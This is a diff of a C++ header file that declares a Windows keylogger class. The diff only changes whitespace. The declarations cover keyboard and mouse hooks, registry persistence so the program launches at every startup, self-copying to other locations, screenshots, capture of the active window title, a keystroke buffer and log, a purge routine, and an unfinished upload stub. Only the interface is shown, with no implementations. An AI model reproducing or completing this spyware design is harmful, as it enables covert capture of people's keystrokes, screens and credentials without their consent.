@@ -46,63 +46,63 @@ class KeyLogger {
 
     public:
 
-	//singleton
+    //singleton
     static KeyLogger* getInstance();
     static void releaseInstance();
 
     //starts listenning
     void listen();
 
-	//ALT state
-	bool KeyLogger::isAltDown() { return altDown; }
-	void KeyLogger::setAltDown(bool down) { altDown = down; }
+    //ALT state
+    bool KeyLogger::isAltDown() { return altDown; }
+    void KeyLogger::setAltDown(bool down) { altDown = down; }
 
-	//CTRL state
-	bool KeyLogger::isCtrlDown() { return ctrlDown; }
-	void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }
+    //CTRL state
+    bool KeyLogger::isCtrlDown() { return ctrlDown; }
+    void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }
 
-	//LEFT SHIFT state
-	bool KeyLogger::isLShiftDown() { return lshiftDown; }
-	void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
-	
-	//RIGHT SHIFT state
-	bool KeyLogger::isRShiftDown() { return rshiftDown; }
-	void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
+    //LEFT SHIFT state
+    bool KeyLogger::isLShiftDown() { return lshiftDown; }
+    void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
+    
+    //RIGHT SHIFT state
+    bool KeyLogger::isRShiftDown() { return rshiftDown; }
+    void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
-	//writes to registry to make the program launch at every startup
-	void persist(std::string path="");
+    //writes to registry to make the program launch at every startup
+    void persist(std::string path="");
 
-	//erases program data
-	void purge();
+    //erases program data
+    void purge();
 
-	//loop for standalone usage
-	void loop();
-	
-	//copy the keylogger to another location
-	void copySelf(std::string target);
+    //loop for standalone usage
+    void loop();
+    
+    //copy the keylogger to another location
+    void copySelf(std::string target);
 
     protected:
 
     KeyLogger();
     ~KeyLogger();
 
-	void log(std::string text);
+    void log(std::string text);
 
-	std::string getTimeString();
+    std::string getTimeString();
 
-	std::string screenshot();
+    std::string screenshot();
 
-	std::string getActiveWindowTitle();
+    std::string getActiveWindowTitle();
 
-	std::string removeFilespec(std::string path);
+    std::string removeFilespec(std::string path);
 
-	void writeBuffer();
+    void writeBuffer();
 
-	void upload() {
-		//not implemented yet
-	}
+    void upload() {
+        //not implemented yet
+    }
 
-	static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
+    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
 
     static KeyLogger* instance;
 
@@ -112,18 +112,18 @@ class KeyLogger {
     bool rshiftDown;
 
     HHOOK khook, mhook;
-	
+    
     std::ofstream logFile;
 
-	std::string programDir;
-	std::string programPath;
-	std::string programName;
+    std::string programDir;
+    std::string programPath;
+    std::string programName;
 
-	std::string keyboardBuffer;
+    std::string keyboardBuffer;
 
-	std::string activeWindowTitle;
+    std::string activeWindowTitle;
 
-	time_t lastUpload;
+    time_t lastUpload;
 };
 
 #endif // H_KEYLOGGER
